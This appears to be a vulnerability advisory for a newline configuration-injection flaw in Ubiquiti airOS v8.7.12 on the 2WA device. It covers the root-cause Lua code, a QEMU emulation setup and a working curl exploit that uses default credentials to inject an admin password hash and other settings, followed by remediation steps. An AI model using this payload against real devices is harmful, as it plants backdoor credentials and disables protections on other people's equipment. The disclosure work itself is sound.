# Ubiquiti 2WA airOS v8.7.12 - Configuration Injection via Newline

## Summary

| Field | Detail |
|---|---|
| **Vendor** | Ubiquiti Inc. |
| **Product** | airOS (airMAX 2WA) |
| **Version** | v8.7.12.47627 (Build 240228.1553) |
| **Type** | CWE-93: CRLF Injection |
| **Severity** | High (CVSS 8.8) |
| **Auth Required** | Yes |

`cfg.set()` in `udapi/cfg.lua` stores values via `tostring()` without filtering newline characters. `cfg.save()` writes `key=value\n` to `/tmp/system.cfg`. A `\n` in a value splits it into separate config entries, allowing injection of arbitrary keys (admin password, service toggles, etc.) through the authenticated `/api/cfg` endpoint.

---

## Root Cause

**cfg.lua:118** - no newline filtering:
```lua
set = function(self, key, value)
  self.keyVal[key] = value and tostring(value)
end
```

**cfg.lua:337-338** - newline causes line split:
```lua
for key, value in pairs(sorted_keys) do
  lines[#lines + 1] = key .. "=" .. value
end
```

**airos-api.lua:1704** - `partial_update` handler only checks `type(value) ~= "string"`, no newline check.

---

## Reproduction

### Environment

- QEMU: `qemu-system-mips 10.2.0`, `-cpu 74Kf`
- Kernel: `vmlinux-3.2.0-4-4kc-malta` (Debian)
- Guest: Debian Wheezy MIPS + firmware chroot

### QEMU Startup

```bash
qemu-system-mips -M malta -cpu 74Kf \
  -kernel vmlinux-3.2.0-4-4kc-malta \
  -hda debian_wheezy_mips_standard.qcow2 \
  -append "root=/dev/sda1 console=ttyS0" \
  -nographic -m 256 \
  -net nic -net user,hostfwd=tcp::8443-:443,hostfwd=tcp::8022-:22
```

### Firmware Setup (inside Debian guest)

```bash
# Copy firmware, create writable rootfs
mkdir -p /mnt/fw_rw
cd /mnt/firmware && cp -a bin etc init lib mnt sbin usr var /mnt/fw_rw/
mkdir -p /mnt/fw_rw/{tmp,proc,dev,var/run,var/log,var/tmp,usr/www,tmp/.sessions}
cp /mnt/fw_rw/etc/system.cfg /mnt/fw_rw/tmp/system.cfg
chmod -R +x /mnt/fw_rw/{bin,sbin,usr/bin,usr/sbin,lib,usr/lib}

# Create board.info (no leading spaces in values)
cat > /mnt/fw_rw/etc/board.info << 'EOF'
board.sysid=0xe812
board.name=2WA
board.hwaddr=00:27:22:AA:BB:CC
board.shortname=2WA
board.cpu=mips74k
board.fla=16777216
board.ram=67108864
board.vendor=ubnt
board.antennas=1
board.antenna.1.id=1
board.antenna.1.builtin=1
board.antenna.1.gain=10
EOF

# SSL cert + lighttpd config
openssl genrsa -out /tmp/server.key 2048
openssl req -new -x509 -key /tmp/server.key -out /tmp/server.crt -days 365 -subj "/CN=UBNT"
cat /tmp/server.key /tmp/server.crt > /mnt/fw_rw/etc/server.pem

cat >> /mnt/fw_rw/etc/lighttpd/lighttpd.conf << 'CONF'
server.document-root = "/usr/www"
server.modules += ("mod_magnet", "mod_cgi")
server.modules += ("mod_openssl")
$SERVER["socket"] == ":443" {
  ssl.engine = "enable"
  ssl.pemfile = "/etc/server.pem"
}
CONF

# Chroot
mount --bind /proc /mnt/fw_rw/proc
mount --bind /dev /mnt/fw_rw/dev
chroot /mnt/fw_rw /bin/sh
```

### Exploit (inside chroot)

```bash
# Start lighttpd
lighttpd -f /etc/lighttpd/lighttpd.conf

# 1. Login
curl -k -v -c /tmp/c.txt -X POST https://127.0.0.1:443/api/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"ubnt","password":"ubnt"}' 2>&1 | grep CSRF
# -> X-CSRF-ID: <token>

# 2. Inject
curl -k -b /tmp/c.txt -X POST https://127.0.0.1:443/api/cfg \
  -H "Content-Type: application/json" \
  -H "X-CSRF-ID: <token>" \
  -d '{"keys":{"aaa.1.wpa.psk":"test\ninjected.evil=pwned\nusers.1.password=$1$xx$fakehash"}}'
# -> {"ok":true}

# 3. Verify
grep -E "injected|fakehash" /tmp/system.cfg
# -> injected.evil=pwned
# -> users.1.password=$1$xx$fakehash
```

---



![alt text](image-1.png)



## Impact

Authenticated attacker can inject arbitrary config keys:

- `users.1.password` - overwrite admin password (persistent backdoor)
- `sshd.status=enabled` - enable SSH
- `httpd.https.status=disabled` - downgrade to HTTP
- PPPoE credentials, SSID, routing, VLAN, etc.

Combined with default credentials (`ubnt/ubnt`), no auth knowledge required on many deployed devices.

---

## Remediation

1. Strip `\n`/`\r` in `cfg.set()`
2. Reject control characters in `partial_update` handler
3. Add passphrase validation (like existing `validateSsid()`)
